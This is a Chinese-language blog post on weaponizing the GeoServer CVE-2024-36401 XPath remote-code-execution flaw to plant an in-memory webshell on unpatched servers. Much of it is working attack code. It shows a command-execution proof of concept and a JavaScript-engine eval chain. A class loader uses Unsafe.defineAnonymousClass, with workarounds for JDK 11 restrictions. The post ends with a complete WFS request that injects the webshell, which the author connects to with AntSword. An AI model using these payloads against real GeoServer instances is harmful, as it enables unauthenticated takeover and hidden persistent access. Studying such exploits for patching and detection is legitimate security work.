# GeoServer property RCE注入内存马


<meta name="referrer" content="no-referrer" />


## 背景
GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。
在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。
from [https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/](https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/)
本文主要研究如何武器化利用，注入内存马。
## 注入内存马
目前市面上公开的POC主要是做到了命令执行：
```
exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2')
```
Apache XPath解析表达式是支持链式调用的，是非常常见的一个表达式注入场景。虽然也可以用ClassPathXmlApplicationContext或者JNDI这种远程加载的方式去加载类，但是总归是有限制，不优雅。可以参考我之前在Kcon上讲过的议题《Java表达式攻防下的黑魔法》，可以利用Js引擎将这类链式调用的命令执行转化为完全体的任意代码执行，并且无需出网，无需额外依赖
Y4tacker也在之前的文章中提到了怎么构造Js引擎的Poc：[https://tttang.com/archive/1771/](https://tttang.com/archive/1771/)
```
eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'java.lang.Runtime.getRuntime().exec("open -na Calculator")')
```
那么似乎我们只需要把Js执行的Payload换成我之前议题中给出的Payload即可：
[https://github.com/yzddmr6/Java-Js-Engine-Payloads](https://github.com/yzddmr6/Java-Js-Engine-Payloads)
但是实际上实现的时候有两个坑
### 无法使用函数
首先利用JMG生成内存马注入代码。由于通过bin形式安装默认是Jetty，这里选择Jetty类型
![image.png](https://cdn.nlark.com/yuque/0/2024/png/1599908/1720079658441-b9c174e6-6745-4495-879b-2af5e7ddad4c.png#averageHue=%23e3e3e3&clientId=u1b3f6587-1bd7-4&from=paste&height=634&id=ub3a612ca&originHeight=1268&originWidth=1786&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1182499&status=done&style=none&taskId=ub8f1e3c7-eedb-4188-aa90-cf588213d10&title=&width=893)
然后将code部分替换
```
function Base64DecodeToByte(str) {
    var bt;
    try {
        bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
    } catch (e) {
        bt = java.util.Base64.getDecoder().decode(str);
    }
    return bt;
}

function defineClass(classBytes) {
    var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
    theUnsafe.setAccessible(true);
    unsafe = theUnsafe.get(null);
    unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), classBytes, null).newInstance();
}

defineClass(Base64DecodeToByte(code));

```
打这个漏洞如果返回java.lang.ClassCastException是正常的，但是出现了下面的报错，说明有问题了。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/1599908/1720079785548-10251d8e-21a3-415c-94b3-ea9d4e0fd8e1.png#averageHue=%23f1eeee&clientId=u1b3f6587-1bd7-4&from=paste&height=631&id=u8b054de0&originHeight=1262&originWidth=1242&originalType=binary&ratio=2&rotation=0&showTitle=false&size=943156&status=done&style=none&taskId=ua5f676a4-123d-4be9-9ed1-b3e80ec4423&title=&width=621)
经过多次测试，发现这里的Payload不能用function的语法。十分神秘，单独测试Js引擎没有这个问题，暂时没有去深入研究原因。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/1599908/1720081272312-7ef5e5fc-438b-45c0-a414-098c26d8b621.png#averageHue=%23f5f2f2&clientId=u1b3f6587-1bd7-4&from=paste&height=618&id=ue466b421&originHeight=1236&originWidth=2470&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1744569&status=done&style=none&taskId=u30217090-8d83-466e-8cfe-9631ab61627&title=&width=1235)
### JDK11下的defineAnonymousClass
重新改成不带function的形式，又出现了另外一个报错
![image.png](https://cdn.nlark.com/yuque/0/2024/png/1599908/1720081971082-d2272089-ad88-4cec-8a5d-3a0e68c7685a.png#averageHue=%23f6f1f1&clientId=u1b3f6587-1bd7-4&from=paste&height=155&id=ud2addb39&originHeight=310&originWidth=2800&originalType=binary&ratio=2&rotation=0&showTitle=false&size=494235&status=done&style=none&taskId=ua30d6431-089e-4d60-897f-3aa142c8756&title=&width=1400)
发现原因是JDK>8时，defineAnonymousClass做了限制，被加载的Class要满足两个条件之一：

1. 没有包名
2. 包名跟第一个参数Class的包名一致，此处为java.lang，否则会报错

![image.png](https://cdn.nlark.com/yuque/0/2024/png/1599908/1720084947981-4e5c8150-2590-489c-a06c-adde4f2f7742.png#averageHue=%23f5f1f1&clientId=u1b3f6587-1bd7-4&from=paste&height=190&id=Yv755&originHeight=380&originWidth=2798&originalType=binary&ratio=2&rotation=0&showTitle=false&size=565637&status=done&style=none&taskId=u635a72ee-e93a-4bc4-8e03-ed4c4fb8fb8&title=&width=1399)
而JDK8及以下无此限制
![image.png](https://cdn.nlark.com/yuque/0/2024/png/1599908/1720084925910-28a05f54-e0ce-4134-a7c3-4cda752c8a20.png#averageHue=%23f6f6f6&clientId=u1b3f6587-1bd7-4&from=paste&height=119&id=OXSlW&originHeight=238&originWidth=1268&originalType=binary&ratio=2&rotation=0&showTitle=false&size=160170&status=done&style=none&taskId=u34fb45f6-b407-4db7-9c84-e4b50559b5f&title=&width=634)
正好JMG提供了修改注入器类名的功能，这里我们随便起一个java.lang.test的名字
![image.png](https://cdn.nlark.com/yuque/0/2024/png/1599908/1720082225134-4aec431e-4a24-4760-9a88-00670cd2f898.png#averageHue=%23e3e3e3&clientId=u1b3f6587-1bd7-4&from=paste&height=634&id=u1ac1146f&originHeight=1268&originWidth=1786&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1177548&status=done&style=none&taskId=u591c7976-665e-459d-93d2-a0f649f190a&title=&width=893)
终于不报错了，注入成功
![image.png](https://cdn.nlark.com/yuque/0/2024/png/1599908/1720082281201-1f7ee460-1207-4d63-9c1e-0eeb192e4f8b.png#averageHue=%23ebeaea&clientId=u1b3f6587-1bd7-4&from=paste&height=690&id=ue91a3527&originHeight=1380&originWidth=2466&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1971462&status=done&style=none&taskId=uc6caa90e-bc3c-4d9c-8b8e-328d6fbb838&title=&width=1233)
连接的时候发现JMG的Jetty-AntSword-Listener类型似乎有BUG，打进去连接不上
随后换成Filter连接成功
![image.png](https://cdn.nlark.com/yuque/0/2024/png/1599908/1720082607075-7daa0b98-ec93-46d0-a845-86813365752a.png#averageHue=%23efefef&clientId=u1b3f6587-1bd7-4&from=paste&height=441&id=u60aec003&originHeight=882&originWidth=1558&originalType=binary&ratio=2&rotation=0&showTitle=false&size=668762&status=done&style=none&taskId=u0249f25a-ea67-4f7b-b7a0-5fcda04444b&title=&width=779)

注入内存马Payload
```
<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'
var str="";
var bt;
try {
    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
} catch (e) {
    bt = java.util.Base64.getDecoder().decode(str);
}
var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafe.setAccessible(true);
unsafe = theUnsafe.get(null);
unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();
')</wfs:valueReference>
</wfs:GetPropertyValue>
```

